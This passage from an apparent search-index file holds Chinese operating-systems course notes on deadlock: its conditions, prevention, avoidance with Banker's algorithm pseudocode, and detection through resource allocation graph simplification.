<p>\u6b7b\u9501\u548c\u9965\u997f\u90fd\u662f\u8fdb\u7a0b\u65e0\u6cd5\u987a\u5229\u5411\u524d\u63a8\u8fdb\u7684\u73b0\u8c61\uff0c\u4f46\u662f\u4ed6\u4eec\u6709\u5982\u4e0b\u5dee\u522b\uff1a</p> <ul> <li>&lt;1&gt; \u53d1\u751f\u9965\u997f\u7684\u8fdb\u7a0b\u53ef\u4ee5\u53ea\u6709\u4e00\u4e2a\uff1b\u800c\u6b7b\u9501\u662f\u56e0\u5faa\u73af\u7b49\u5f85\u5bf9\u65b9\u624b\u91cc\u7684\u8d44\u6e90\u5bfc\u81f4\u7684\uff0c\u56e0\u6b64\u53d1\u751f\u6b7b\u9501\u7684\u8fdb\u7a0b\u5fc5\u7136\u5927\u4e8e\u7b49\u4e8e\u4e24\u4e2a</li> <li>&lt;2&gt; \u53d1\u751f\u9965\u997f\u7684\u8fdb\u7a0b\u53ef\u80fd\u5904\u4e8e Ready \u72b6\u6001\uff08\u957f\u671f\u5f97\u4e0d\u5230 CPU\uff09\uff0c\u4e5f\u53ef\u80fd\u5904\u4e8e Waiting \u72b6\u6001\uff08\u957f\u671f\u5f97\u4e0d\u5230 I/O \u8bbe\u5907\uff09\uff1b\u800c\u53d1\u751f\u6b7b\u9501\u7684\u8fdb\u7a0b\u53ea\u80fd\u5904\u4e8e Waiting \u72b6\u6001</li> </ul> <p>\u4ea7\u751f\u6b7b\u9501\u5fc5\u987b\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0b\u56db\u4e2a\u6761\u4ef6\uff1a</p> <ul> <li>&lt;1&gt; \u4e92\u65a5\u6761\u4ef6 Mutual Exclusion: \u8fdb\u7a0b\u8981\u6c42\u5bf9\u6240\u5206\u914d\u7684\u8d44\u6e90\u8fdb\u884c\u6392\u4ed6\u6027\u4f7f\u7528\uff0c\u5373\u4e00\u6bb5\u65f6\u95f4\u5185\u67d0\u8d44\u6e90\u53ea\u80fd\u4e3a\u4e00\u4e2a\u8fdb\u7a0b\u5360\u7528\uff0c\u6b64\u65f6\u5176\u5b83\u8bf7\u6c42\u8be5\u8d44\u6e90\u7684\u8fdb\u7a0b\u53ea\u80fd\u7b49\u5f85</li> <li>&lt;2&gt; \u4e0d\u53ef\u5265\u593a\u6761\u4ef6 No Preemption: \u8fdb\u7a0b\u6240\u83b7\u5f97\u8d44\u6e90\u4f7f\u7528\u5b8c\u524d\uff0c\u4e0d\u80fd\u88ab\u5176\u5b83\u8fdb\u7a0b\u593a\u8d70\uff0c\u53ea\u80fd\u4e3b\u52a8\u91ca\u653e<ul> <li>\u53ea\u6709\u5bf9\u4e0d\u53ef\u5265\u593a\u8d44\u6e90\uff08\u5982\u6253\u5370\u673a\uff09\u7684\u7ade\u4e89\u624d\u4f1a\u4ea7\u751f\u6b7b\u9501\uff0c\u5bf9\u53ef\u5265\u593a\u8d44\u6e90\uff08\u5982 CPU \u548c Memory\uff09\u7ade\u4e89\u4e0d\u4ea7\u751f\u6b7b\u9501</li> </ul> </li> <li>&lt;3&gt; \u8bf7\u6c42\u5e76\u4fdd\u6301\u6761\u4ef6 Hold And Wait: \u8fdb\u7a0b\u5df2\u7ecf\u4fdd\u6301\u4e86\u81f3\u5c11\u4e00\u4e2a\u8d44\u6e90\uff0c\u4f46\u53c8\u63d0\u51fa\u4e86\u65b0\u7684\u8d44\u6e90\u8bf7\u6c42\uff0c\u800c\u8be5\u8d44\u6e90\u5df2\u88ab\u5176\u5b83\u8fdb\u7a0b\u5360\u7528\uff0c\u6b64\u65f6\u8bf7\u6c42\u8fdb\u7a0b\u88ab\u963b\u585e\uff0c\u4f46\u81ea\u5df1\u5df2\u83b7\u5f97\u7684\u8d44\u6e90\u4fdd\u6301\u4e0d\u53d8</li> <li>&lt;4&gt; \u5faa\u73af\u7b49\u5f85\u6761\u4ef6 Circular Wait: \u5b58\u5728\u8d44\u6e90\u5faa\u73af\u7b49\u5f85\u94fe\uff0c\u94fe\u4e2d\u6bcf\u4e2a\u8fdb\u7a0b\u5df2\u83b7\u5f97\u7684\u8d44\u6e90\u540c\u65f6\u88ab\u94fe\u4e2d\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u6240\u8bf7\u6c42<ul> <li>\u5373\u5b58\u5728\u4e00\u4e2a\u5904\u4e8e\u7b49\u5f85\u6001\u7684\u8fdb\u7a0b\u96c6\u5408 \\(\\{P_1, P_2, ..., P_n\\}\\)\uff0c\u5176\u4e2d \\(P_i\\) \u7b49\u5f85\u7684\u8d44\u6e90\u88ab \\(P_{i+1}\\) \u6240\u5360\u6709\uff0c\\(P_n\\) \u7b49\u5f85\u7684\u8d44\u6e90\u88ab \\(P_0\\) \u5360\u6709</li> </ul> </li> </ul> <p></p> <p>\u5bf9\u4e8e\u53f3\u56fe\uff0c\u5047\u8bbe\u7cfb\u7edf\u4e2d\u5171\u6709\u4e24\u4e2a\u8be5\u7c7b\u8d44\u6e90\uff0c\u5e76\u4e14\u5176\u4e2d\u4e00\u4e2a\u8d44\u6e90\u88ab \\(P_K\\) \u5360\u7528\uff0c\u800c\u53e6\u4e00\u4e2a\u8d44\u6e90\u5904\u4e8e\u5faa\u73af\u7b49\u5f85\u5708\u4e2d\uff08\u4f8b\u5982\u88ab \\(P_0\\)\uff09\u5360\u6709\u3002\u90a3\u4e48\u867d\u7136\u6ee1\u8db3\u4e86\u4e0a\u8ff0\u6240\u8bf4\u7684\u6761\u4ef6\u56db\uff0c\u4f46\u662f\u5982\u679c\u6b64\u65f6 \\(P_K\\) \u5c06\u8d44\u6e90\u91ca\u653e\uff0c\\(P_n\\) \u5c31\u80fd\u83b7\u5f97\u8be5\u8d44\u6e90\uff0c\u5faa\u73af\u7b49\u5f85\u5c31\u4f1a\u88ab\u6253\u7834\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u8bf4\u5faa\u73af\u7b49\u5f85\u53ea\u662f\u6b7b\u9501\u7684\u5fc5\u8981\u6761\u4ef6\uff1b\u4f46\u82e5\u7cfb\u7edf\u4e2d\u6bcf\u7c7b\u8d44\u6e90\u90fd\u53ea\u6709\u4e00\u4e2a\u8d44\u6e90\uff0c\u5219\u8d44\u6e90\u5206\u914d\u56fe\u4e2d\u542b\u5708\u5c31\u53d8\u6210\u4e86\u7cfb\u7edf\u51fa\u73b0\u6b7b\u9501\u7684\u5145\u5206\u5fc5\u8981\u6761\u4ef6\u3002</p> <p>\u4e3a\u4f7f\u7cfb\u7edf\u4e0d\u53d1\u751f\u6b7b\u9501\uff0c\u5fc5\u987b\u8bbe\u6cd5\u7834\u574f\u4ea7\u751f\u6b7b\u9501\u7684\u56db\u4e2a\u6761\u4ef6\u4e4b\u4e00\uff1b\u6216\u8005\u5141\u8bb8\u6b7b\u9501\u7684\u53d1\u751f\uff0c\u4f46\u5f53\u6b7b\u9501\u53d1\u751f\u65f6\u80fd\u591f\u68c0\u6d4b\u5230\uff0c\u5e76\u4e14\u6709\u80fd\u529b\u6062\u590d\u3002</p> \u5b9e\u73b0\u65b9\u6848 \u8d44\u6e90\u5206\u914d\u7b56\u7565 \u4e3b\u8981\u4f18\u70b9 \u4e3b\u8981\u7f3a\u70b9 \u6b7b\u9501\u9884\u9632 \u8bbe\u7f6e\u9650\u5236\u6761\u4ef6\uff0c\u7834\u73af\u4ea7\u751f\u6b7b\u9501\u7684 4 \u4e2a\u5fc5\u8981\u6761\u4ef6 \u4fdd\u5b88\uff0c\u5b81\u53ef\u8d44\u6e90\u95f2\u7f6e \u9002\u7528\u4e8e\u7a81\u53d1\u5f0f\u5904\u7406\uff0c\u4e0d\u5fc5\u8fdb\u884c\u5265\u593a \u6548\u7387\u4f4e\uff0c\u521d\u59cb\u5316\u65f6\u95f4\u957f\uff1b\u5265\u593a\u6b21\u6570\u591a\uff1b\u4e0d\u4fbf\u7075\u6d3b\u7533\u8bf7\u65b0\u8d44\u6e90 \u6b7b\u9501\u907f\u514d \u8d44\u6e90\u52a8\u6001\u5206\u914d\u8fc7\u7a0b\u4e2d\uff0c\u5bfb\u627e\u53ef\u80fd\u7684\u5b89\u5168\u5141\u8bb8\u987a\u5e8f\uff0c\u9632\u6b62\u7cfb\u7edf\u8fdb\u5165\u4e0d\u5b89\u5168\u72b6\u6001 \u9884\u9632\u548c\u68c0\u6d4b\u7684\u6298\u4e2d\uff0c\u8fd0\u884c\u65f6\u5224\u65ad\u662f\u5426\u6b7b\u9501 \u4e0d\u5fc5\u8fdb\u884c\u5265\u593a \u5fc5\u987b\u77e5\u9053\u5c06\u6765\u7684\u8d44\u6e90\u9700\u6c42\uff1b\u8fdb\u7a0b\u4e0d\u80fd\u88ab\u957f\u65f6\u95f4\u963b\u585e \u6b7b\u9501\u68c0\u6d4b \u5141\u8bb8\u6b7b\u9501\uff0c\u5b9a\u671f\u68c0\u67e5\u6b7b\u9501\u662f\u5426\u5df2\u7ecf\u53d1\u751f\uff0c\u901a\u8fc7\u5265\u593a\u7b49\u63aa\u65bd\u89e3\u9664\u6b7b\u9501 \u5bbd\u677e\uff0c\u53ea\u8981\u5141\u8bb8\u5c31\u5206\u914d\u8d44\u6e90 \u4e0d\u5ef6\u957f\u8fdb\u7a0b\u521d\u59cb\u5316\u65f6\u95f4 \u901a\u8fc7\u5265\u593a\u89e3\u9664\u6b7b\u9501\uff0c\u9020\u6210\u635f\u5931"},{"location":"Courses/OS/Topic3/#deadlock-prevention","title":"Deadlock Prevention","text":"<p>\u6b7b\u9501\u9884\u9632\u9700\u8981\u7834\u574f\u6b7b\u9501\u4ea7\u751f\u7684 4 \u4e2a\u5fc5\u8981\u6761\u4ef6\u4e4b\u4e00\u3002</p> <ul> <li>&lt;1&gt; \u7834\u574f\u4e92\u65a5\u6761\u4ef6<ul> <li>\u82e5\u5c06\u53ea\u80fd\u4e92\u65a5\u4f7f\u7528\u7684\u8d44\u6e90\u6539\u9020\u4e3a\u5141\u8bb8\u5171\u4eab\u4f7f\u7528\uff0c\u5219\u7cfb\u7edf\u4e0d\u4f1a\u8fdb\u5165\u6b7b\u9501\u72b6\u6001</li> <li>\u4f46\u5f88\u591a\u4e34\u754c\u8d44\u6e90\u53ea\u80fd\u4e92\u65a5\u4f7f\u7528\uff0c\u56e0\u6b64\u8be5\u65b9\u6cd5\u4e0d\u592a\u53ef\u884c</li> </ul> </li> <li>&lt;2&gt; \u7834\u574f\u4e0d\u53ef\u5265\u593a\u6761\u4ef6<ul> <li>\u5f53\u4e00\u4e2a\u5df2\u7ecf\u4fdd\u6301\u4e86\u67d0\u4e9b\u4e0d\u53ef\u5265\u593a\u8d44\u6e90\u7684\u8fdb\u7a0b\uff0c\u8bf7\u6c42\u65b0\u7684\u8d44\u6e90\u800c\u5f97\u4e0d\u5230\u6ee1\u8db3\u65f6\uff0c\u5b83\u5fc5\u987b\u91ca\u653e\u5df2\u7ecf\u4fdd\u6301\u7684\u6240\u6709\u8d44\u6e90</li> <li>\u8fd9\u610f\u5473\u7740\uff0c\u8fdb\u7a0b\u5df2\u5360\u6709\u7684\u8d44\u6e90\u4f1a\u88ab\u6682\u65f6\u91ca\u653e\uff0c\u6216\u8005\u79f0\u88ab\u5265\u593a\u4e86</li> <li>\u8be5\u65b9\u6cd5\u5b9e\u73b0\u590d\u6742\uff0c\u4e14\u53ef\u80fd\u4f1a\u5bfc\u81f4\u524d\u4e00\u9636\u6bb5\u5de5\u4f5c\u5931\u6548</li> </ul> </li> <li>&lt;3&gt; \u7834\u574f\u8bf7\u6c42\u5e76\u4fdd\u6301\u6761\u4ef6<ul> <li>\u8981\u6c42\u8fdb\u7a0b\u5728\u8bf7\u6c42\u8d44\u6e90\u65f6\u4e0d\u80fd\u6301\u6709\u4e0d\u53ef\u5265\u593a\u8d44\u6e90\uff0c\u5177\u4f53\u6709\u4ee5\u4e0b\u4e24\u79cd\u5b9e\u73b0\u65b9\u5f0f<ul> <li> <ol> <li>\u8981\u6c42\u8fdb\u7a0b\u5728\u80fd\u591f\u83b7\u53d6\u6240\u9700\u7684\u6240\u6709\u8d44\u6e90\u524d\u4e0d\u80fd\u8fd0\u884c\u3002\u8fdb\u7a0b\u8fd0\u884c\u671f\u95f4\u4e0d\u4f1a\u518d\u7533\u8bf7\u8d44\u6e90\uff0c\u4ece\u800c\u7834\u574f\u201c\u8bf7\u6c42\u201d\uff1b\u5728\u7b49\u5f85\u83b7\u53d6\u671f\u95f4\uff0c\u8fdb\u7a0b\u4e0d\u5360\u6709\u4efb\u4f55\u8d44\u6e90\uff0c\u4ece\u800c\u7834\u574f\u201c\u4fdd\u6301\u201d</li> </ol> </li> <li> <ol> <li>\u5141\u8bb8\u8fdb\u7a0b\u00b7\u83b7\u5f97\u8fd0\u884c\u6240\u9700\u7684\u90e8\u5206\u8d44\u6e90\u540e\u5c31\u8fd0\u884c\uff0c\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u9010\u6b65\u91ca\u653e\uff0c\u53ea\u6709\u5168\u90e8\u91ca\u653e\u540e\u624d\u80fd\u8bf7\u6c42\u65b0\u7684\u8d44\u6e90</li> </ol> </li> </ul> </li> <li>\u65b9\u6cd5\u4e00\u5b9e\u73b0\u7b80\u5355\uff0c\u4f46\u4f1a\u9020\u6210\u8d44\u6e90\u6d6a\u8d39\uff0c\u4e5f\u4f1a\u5bfc\u81f4\u9965\u997f\u73b0\u8c61\uff1b\u76f8\u5bf9\u6765\u8bb2\uff0c\u65b9\u6cd5\u4e8c\u66f4\u52a0\u4f18\u79c0</li> </ul> </li> <li>&lt;4&gt; \u7834\u574f\u5faa\u73af\u7b49\u5f85\u6761\u4ef6<ul> <li>\u91c7\u7528\u987a\u5e8f\u8d44\u6e90\u5206\u914d\u6cd5\uff0c\u7ed9\u7cfb\u7edf\u4e2d\u5404\u7c7b\u8d44\u6e90\u7f16\u53f7\uff0c\u53ea\u5141\u8bb8\u8fdb\u7a0b\u6309\u7167\u7f16\u53f7\u9012\u589e\u7684\u987a\u5e8f\u8bf7\u6c42\u8d44\u6e90</li> <li>\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u6709\u5728\u5df2\u7ecf\u4fdd\u6301\u5c0f\u7f16\u53f7\u8d44\u6e90\u65f6\uff0c\u624d\u80fd\u7533\u8bf7\u66f4\u5927\u7f16\u53f7\u8d44\u6e90\uff0c\u56e0\u6b64\u5df2\u6301\u6709\u5927\u7f16\u53f7\u8d44\u6e90\u7684\u8fdb\u7a0b\u4e0d\u80fd\u518d\u9006\u5411\u7533\u8bf7\u5c0f\u7f16\u53f7\u8d44\u6e90\uff0c\u56e0\u6b64\u4e0d\u4f1a\u4ea7\u751f\u5faa\u73af\u7b49\u5f85\u6761\u4ef6</li> <li>\u7f3a\u70b9\u5728\u4e8e\uff0c\u7f16\u53f7\u65f6\u53ea\u80fd\u8003\u8651\u5927\u591a\u6570\u8d44\u6e90\u4f7f\u7528\u8fd9\u4e9b\u8d44\u6e90\u7684\u987a\u5e8f\uff0c\u5b9e\u9645\u4f7f\u7528\u987a\u5e8f\u53ef\u80fd\u4e0e\u7f16\u53f7\u4e0d\u4e00\u81f4\uff0c\u4ece\u800c\u5bfc\u81f4\u7f16\u7a0b\u56f0\u96be\u548c\u8d44\u6e90\u6d6a\u8d39</li> </ul> </li> </ul>"},{"location":"Courses/OS/Topic3/#deadlock-avoidance","title":"Deadlock Avoidance","text":"<p>\u6b7b\u9501\u907f\u514d\u540c\u6837\u5c5e\u4e8e\u4e8b\u5148\u9884\u9632\u7b56\u7565\u3002\u5bf9\u4e8e\u6bcf\u6b21\u8d44\u6e90\u7533\u8bf7\u64cd\u4f5c\uff0c\u53ea\u6709\u5728\u4e0d\u4ea7\u751f\u6b7b\u9501\u7684\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u624d\u4f1a\u4e3a\u5176\u5206\u914d\u8d44\u6e90\u3002</p> <p>\u5f53\u7cfb\u7edf\u80fd\u591f\u6309\u7167\u67d0\u79cd\u987a\u5e8f\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u5206\u914d\u5176\u6240\u9700\u7684\u8d44\u6e90\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5bfc\u81f4\u6b7b\u9501\uff0c\u6b64\u65f6\u8be5\u987a\u5e8f\u5c31\u88ab\u79f0\u4e3a\u5b89\u5168\u5e8f\u5217\uff08\u53ef\u80fd\u6709\u591a\u4e2a\uff09\u3002\u82e5\u7cfb\u7edf\u80fd\u627e\u5230\u8fd9\u4e48\u4e00\u4e2a\u5b89\u5168\u5e8f\u5217\uff0c\u5219\u6b64\u65f6\u4e3a Safe State\uff1b\u82e5\u4e0d\u80fd\uff0c\u5219\u79f0\u7cfb\u7edf\u5904\u4e8e Unsafe State\u3002</p> <p>\u53ea\u6709\u5f53\u7cfb\u7edf\u5904\u4e8e Unsafe State \u65f6\uff0c\u624d\u6709\u53ef\u80fd\u51fa\u73b0\u6b7b\u9501\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u4fdd\u8bc1\u7cfb\u7edf\u4e0d\u4f1a\u8fdb\u5165 Unsafe State\u3002</p> <p>\u94f6\u884c\u5bb6\u7b97\u6cd5\u662f\u6700\u8457\u540d\u7684\u6b7b\u9501\u907f\u514d\u7b97\u6cd5\u3002\u8be5\u7b97\u6cd5\u5c06\u64cd\u4f5c\u7cfb\u7edf\u89c6\u4e3a\u94f6\u884c\u5bb6\uff0c\u7ba1\u7406\u7684\u8d44\u6e90\u89c6\u4e3a\u8d44\u91d1\uff0c\u8fdb\u7a0b\u8bf7\u6c42\u8d44\u6e90\u76f8\u5f53\u4e8e\u5411\u94f6\u884c\u5bb6\u8d37\u6b3e\u3002\u8fdb\u7a0b\u8fd0\u884c\u524d\u9700\u8981\u58f0\u660e\u5bf9\u5404\u79cd\u8d44\u6e90\u7684\u6700\u5927\u9700\u6c42\u91cf\uff0c\u5176\u6570\u91cf\u4e0d\u8d85\u8fc7\u7cfb\u7edf\u7684\u8d44\u6e90\u603b\u91cf\u3002</p> <p>\u5047\u5b9a\u6211\u4eec\u6709 \\(n\\) \u4e2a\u8fdb\u7a0b\uff0c\\(m\\) \u7c7b\u8d44\u6e90\uff0c\u6211\u4eec\u5b9a\u4e8e\u5982\u4e0b\u6570\u636e\u7ed3\u6784\uff1a</p> <ul> <li>\u53ef\u5229\u7528\u5411\u91cf\u8d44\u6e90 <code>Available[m]</code>: \u542b\u6709 \\(m\\) \u4e2a\u5143\u7d20\u7684\u6570\u7ec4\uff0c<code>Available[j]=K</code> \u8868\u793a\u6b64\u65f6\u7cfb\u7edf\u4e2d\u6709 \\(K\\) \u4e2a \\(R_j\\) \u7c7b\u8d44\u6e90\u53ef\u7528</li> <li>\u6700\u5927\u9700\u6c42\u77e9\u9635 <code>Max[n][m]</code>: \u5b9a\u4e49\u7cfb\u7edf\u4e2d \\(n\\) \u4e2a\u8fdb\u7a0b\u4e2d\u6bcf\u4e2a\u8fdb\u7a0b\u5bf9 \\(m\\) \u7c7b\u8d44\u6e90\u7684\u6700\u5927\u9700\u6c42\uff0c<code>Max[i][j]=K</code> \u8868\u793a\u8fdb\u7a0b \\(P_i\\) \u9700\u8981 \\(R_j\\) \u7c7b\u8d44\u6e90\u7684\u6700\u5927\u6570\u91cf\u4e3a \\(K\\)</li> <li>\u5206\u914d\u77e9\u9635 <code>Allocation[n][m]</code>: \u5b9a\u4e49\u7cfb\u7edf\u4e2d\u6bcf\u7c7b\u8d44\u6e90\u5f53\u524d\u5df2\u5206\u914d\u7684\u8d44\u6e90\u6570\uff0c<code>Allocation[i][j]=K</code> \u8868\u793a\u8fdb\u7a0b \\(P_i\\) \u5df2\u83b7\u5f97 \\(R_j\\) \u7c7b\u8d44\u6e90\u7684\u6570\u91cf\u4e3a \\(K\\)</li> <li>\u9700\u6c42\u77e9\u9635 <code>Need[n][m]</code>: \u8868\u793a\u6bcf\u4e2a\u8fdb\u7a0b\u63a5\u4e0b\u6765\u6700\u591a\u8fd8\u9700\u8981\u591a\u5c11\u4e2a\u8d44\u6e90\uff0c<code>Need[i][j]=K</code> \u8868\u793a\u8fdb\u7a0b \\(P_i\\) \u8fd8\u9700\u8981 \\(R_j\\) \u7c7b\u8d44\u6e90\u7684\u6570\u91cf\u4e3a \\(K\\)</li> </ul> <p>\u901a\u5e38\u77e9\u9635 <code>Need</code> \u4e0d\u662f\u5df2\u77e5\u7684\uff0c\u800c\u662f\u5728\u89e3\u9898\u8fc7\u7a0b\u4e2d\u8ba1\u7b97\u5f97\u5230: <code>Need[i,j]=Max[i,j]-Allocation[i,j]</code></p> <p>\u5047\u5b9a\u6211\u4eec\u5c06\u6240\u6709\u8fdb\u7a0b\u7684\u8bf7\u6c42\u5411\u91cf\u5b58\u50a8\u5728\u77e9\u9635 <code>Request[n][m]</code> \u4e2d\uff0c\u90a3\u4e48\u94f6\u884c\u5bb6\u7b97\u6cd5\u7684\u4f2a\u4ee3\u7801\u53ef\u4ee5\u5c55\u793a\u4e3a\uff1a</p> <pre><code>// \u5f53\u8fdb\u7a0b P_i \u53d1\u51fa\u8d44\u6e90\u8bf7\u6c42 Request[i]\uff1a\nif Request[i] &gt; Need[i]:\n    error;           // \u6240\u9700\u8d44\u6e90\u8d85\u51fa\u5ba3\u5e03\u7684\u6700\u5927\u503c\nif Request[i] &gt; Available:\n    P_i Wait;            // \u5c1a\u65e0\u8db3\u591f\u8d44\u6e90\uff0c\u7b49\u5f85\n\n// \u5168\u90e8\u6761\u4ef6\u6ee1\u8db3\uff0c\u8bd5\u63a2\u6027\u5206\u914d\u8d44\u6e90\u5e76\u66f4\u65b0\u6570\u636e\u7ed3\u6784\nAvailable[j]     -= Request[j];\nAllocation[i][j] += Request[j];\nNeed[i][j]       -= Request[j];\n\n// \u6267\u884c Safety Algorithm\uff0c\u82e5\u901a\u8fc7\u624d\u6b63\u5f0f\u5206\u914d\u8d44\u6e90\u7ed9 P_i\nif Safety():\n    // \u5206\u914d\u540e\u4e3a Safe State\uff0c\u6b63\u5f0f\u5206\u914d\n    grant request;\nelse:\n    // \u56de\u6eda\n    Available     += Request[i]\n    Allocation[i] -= Request[i]\n    Need[i]       += Request[i]\n    P_i Wait;\n</code></pre> <p>\u5176\u4e2d\u4f7f\u7528\u7684\u5b89\u5168\u6027\u7b97\u6cd5\u4f2a\u4ee3\u7801\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a</p> <pre><code>bool Safety() {\n    Work = Available;\n    Finish[n] = {0};   // \u521d\u59cb\u5316\u4e3a 0\n    while exists p such that\n            Finish[p] == 0           // \u8be5\u8fdb\u7a0b\u8fd8\u672a\u8fd0\u884c\u7ed3\u675f\n            &amp;&amp; Need[p] &lt;= Work:      // \u8be5\u8fdb\u7a0b\u6240\u9700\u8d44\u6e90\u5c0f\u4e8e\u53ef\u7528\u8d44\u6e90\n        Work = Work + Allocation[p]; // \u5047\u5b9a\u8be5\u8fdb\u7a0b\u91ca\u653e\u8d44\u6e90\n        Finish[p] = 1;               // \u5047\u5b9a\u8be5\u8fdb\u7a0b\u8fd0\u884c\u7ed3\u675f\n\n    if all(Finish == 1):\n        return true;   // Safe State\n    else:\n        return false;  // Unsafe State\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c\u5404\u4e2a\u8fdb\u7a0b\u8fdb\u5165\u5411\u91cf <code>Finish</code> \u7684\u987a\u5e8f\u5373\u4e3a\u4e00\u4e2a\u53ef\u884c\u7684\u5b89\u5168\u5e8f\u5217\uff0c\u82e5\u8fd0\u884c\u7ed3\u675f\u540e\u5b89\u5168\u5e8f\u5217\u4e2d\u5305\u542b\u4e86\u6240\u6709\u8fdb\u7a0b\uff08\u5373\u6240\u6709\u5747\u4e3a 1\uff09\uff0c\u6b64\u65f6\u7cfb\u7edf\u5c31\u5904\u4e8e\u5b89\u5168\u72b6\u6001\uff1b\u5426\u5219\u4e3a\u4e0d\u5b89\u5168\u72b6\u6001\u3002</p>"},{"location":"Courses/OS/Topic3/#deadlock-detection","title":"Deadlock Detection","text":"<p>\u5728\u8d44\u6e90\u5206\u914d\u56fe\u4e2d\uff0c\u6211\u4eec\u7528\u5706\u5708\u8868\u793a\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u7528\u6846\u8868\u793a\u4e00\u7c7b\u8d44\u6e90\uff0c\u6846\u5185\u6bcf\u4e2a\u5706\u8868\u793a\u8be5\u7c7b\u8d44\u6e90\u4e2d\u7684\u4e00\u4e2a\u8d44\u6e90\u3002\u4ece\u8fdb\u7a0b\u5230\u8d44\u6e90\u7684\u6709\u5411\u8fb9\u79f0\u4e3a\u8bf7\u6c42\u8fb9\uff0c\u8868\u793a\u8be5\u8fdb\u7a0b\u7533\u8bf7\u4e00\u4e2a\u5355\u4f4d\u7684\u8be5\u7c7b\u8d44\u6e90\uff1b\u4ece\u8d44\u6e90\u5230\u8fdb\u7a0b\u7684\u6709\u5411\u8fb9\u79f0\u4e3a\u5206\u914d\u8fb9\uff0c\u8868\u793a\u8be5\u7c7b\u8d44\u6e90\u5df2\u6709\u4e00\u4e2a\u8d44\u6e90\u5206\u914d\u7ed9\u4e86\u8be5\u8fdb\u7a0b\u3002</p> <p></p> <p>\u4f8b\u5982\u4e0a\u56fe(a)\u4e2d\uff0c\u8fdb\u7a0b \\(P_1\\) \u5df2\u5206\u5f97\u4e24\u4e2a\u8d44\u6e90 \\(R_1\\)\uff0c\u5e76\u6b63\u5728\u8bf7\u6c42\u4e00\u4e2a\u8d44\u6e90 \\(R_2\\)\uff1b\u8fdb\u7a0b \\(P_2\\) \u5df2\u5206\u5f97\u4e00\u4e2a\u8d44\u6e90 \\(R_1\\) \u548c\u4e00\u4e2a\u8d44\u6e90 \\(R_2\\)\uff0c\u5e76\u6b63\u5728\u8bf7\u6c42\u4e00\u4e2a\u8d44\u6e90 \\(R_1\\)\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u201c\u7b80\u5316\u201d\u8d44\u6e90\u5206\u914d\u56fe\u6765\u68c0\u6d4b\u5f53\u524d\u7cfb\u7edf\u72b6\u6001 \\(S\\) \u662f\u5426\u4e3a\u6b7b\u9501\u72b6\u6001\uff0c\\(S\\) \u4e3a\u6b7b\u9501\u7684\u6761\u4ef6\u662f\u5f53\u4e14\u4ec5\u5f53\u8d44\u6e90\u5206\u914d\u56fe\u662f\u4e0d\u53ef\u5b8c\u5168\u7b80\u5316\u7684\u3002\u7b80\u5316\u7684\u5177\u4f53\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <ul> <li>&lt;1&gt; \u627e\u5230\u6240\u6709\u65e2\u4e0d\u963b\u585e\u4e5f\u4e0d\u5b64\u7acb\u7684\u8fdb\u7a0b\u91ca\u653e\uff0c\u6d88\u53bb\u8be5\u8fdb\u7a0b\u7684\u6240\u6709\u6709\u5411\u8fb9<ul> <li>\u5373\u627e\u5230\u4e00\u4e2a\u5b58\u5728\u6709\u5411\u8fb9\u4e0e\u5b83\u76f8\u8fde\u7684\u8fdb\u7a0b\uff0c\u4e14\u8be5\u6709\u5411\u8fb9\u5bf9\u5e94\u7684\u8d44\u6e90\u7684\u7533\u8bf7\u6570\u91cf\u5c0f\u4e8e\u8be5\u8d44\u6e90\u7684\u7a7a\u95f2\u6570\u91cf\uff1b\u82e5\u6240\u6709\u8fde\u63a5\u8be5\u8fdb\u7a0b\u7684\u8fb9\u90fd\u6ee1\u8db3\u8be5\u6761\u4ef6\uff0c\u5219\u8bf4\u660e\u8fd9\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u8fd0\u884c\u5b8c\u6210\uff0c\u6d88\u53bb\u5b83\u7684\u6240\u6709\u8bf7\u6c42\u8fb9\u548c\u5206\u914d\u8fb9</li> <li>\u7a7a\u95f2\u6570\u91cf\u5373\u8be5\u8d44\u6e90\u7684\u6570\u91cf\u51cf\u53bb\u5b83\u5728\u8d44\u6e90\u5206\u914d\u56fe\u4e2d\u7684\u51fa\u5ea6\uff0c\u4f8b\u5982\u4e0a\u56fe\u8d44\u6e90 \\(R_1\\) \u7a7a\u95f2\u6570\u91cf\u4e3a \\(3-3=0\\)\uff0c\u800c\u8d44\u6e90 \\(R_2\\) \u7684\u7a7a\u95f2\u6570\u91cf\u4e3a \\(2-1=1\\)</li> </ul> </li> <li>&lt;2&gt; \u7b2c\u4e00\u6b65\u4e2d\u91ca\u653e\u7684\u8d44\u6e90\u53ef\u80fd\u53ef\u4ee5\u5524\u9192\u67d0\u4e9b\u56e0\u7b49\u5f85\u8fd9\u4e9b\u8d44\u6e90\u800c\u88ab\u963b\u585e\u7684\u8fdb\u7a0b\uff0c\u91cd\u590d\u6b65\u9aa4\u4e00\u8fdb\u884c\u7b80\u5316<ul> <li>\u5982\u679c\u80fd\u6d88\u53bb\u56fe\u4e2d\u6240\u6709\u7684\u8fb9\uff0c\u5219\u79f0\u8be5\u56fe\u662f\u53ef\u5b8c\u5168\u7b80\u5316\u7684</li> </ul> </li> </ul> <p>\u4e00\u65e6\u68c0\u6d4b\u51fa\u6b7b\u9501\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u67d0\u4e9b\u63aa\u65bd\u6765\u89e3\u9664\u6b7b\u9501\u3002\u6b64\u5904\u7b80\u7565\u8bb2\u8ff0\u51e0\u79cd\u63aa\u65bd\uff1a</p> <ul> <li>&lt;1&gt; \u8d44\u6e90\u5265\u593a\u6cd5: \u6302\u8d77\u67d0\u4e9b\u6b7b\u9501\u8fdb\u7a0b\uff0c\u5e76\u62a2\u5360\u5b83\u7684\u8d44\u6e90\uff0c\u5c06\u8fd9\u4e9b\u8d44\u6e90\u5206\u914d\u7ed9\u5176\u5b83\u6b7b\u9501\u8fdb\u7a0b<ul> 